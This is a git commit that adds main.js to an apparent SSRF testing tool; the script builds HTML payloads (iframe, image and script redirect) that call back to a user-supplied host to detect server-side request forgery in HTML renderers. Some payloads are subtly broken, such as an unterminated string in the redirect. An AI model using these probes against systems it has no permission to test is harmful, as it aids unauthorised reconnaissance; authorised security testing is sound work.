48babb930c0dc06e6614fb091535a23c1c8dd1c1
tommyboyhacking <98174890+tommyboyhacking@users.noreply.github.com>
2025-05-19 11:39:50 -0400

    Create main.js

---
+++ SSRF-Test-Gen/main.js
@@ -0,0 +1,46 @@
+var callbackHost = document.getElementById("callback-host");
+var submitButton = document.getElementById("submit");
+var payloadOutput = document.getElementById("payload-output");
+var selectedPayload = document.getElementById("select-payload");
+
+function handleSubmit () {
+    var userHost = callbackHost.value;
+    var payloadType = selectedPayload.value;
+    var iframeOutput = document.getElementById("payload-output");
+    var imageOutput = document.getElementById("payload-output");
+    var jsexecOutput = document.getElementById("payload-output");
+    var fingerprintOutput = document.getElementById("payload-output");
+    if (payloadType == "Load iframes") {
+        iframeOutput.value = `
+<html>
+<h1>Iframe Render Test</h1>
+<body>
+<iframe src="${userHost}">
+</body>
+</html>`;
+    } else if (payloadType == 'Load Images') {
+        imageOutput.value = `
+<html>
+<h1>Image Render Test</h1>
+<body>
+<img src=${userHost}>
+</body>
+</html>`;
+    } else if (payloadType == 'Test JS Execution') {
+        jsexecOutput.value = `
+<html>
+<h1> JS Execution Test </h1>
+<body>
+<script>
+window.location.replace("${userHost}/scripted);
+</script>
+</body>
+</html>`;
+    } else if (payloadType == 'Browser Fingerprint') {
+        fingerprintOutput = `
+N/A
+`
+    }
+}
+
+submitButton.addEventListener('click', handleSubmit);
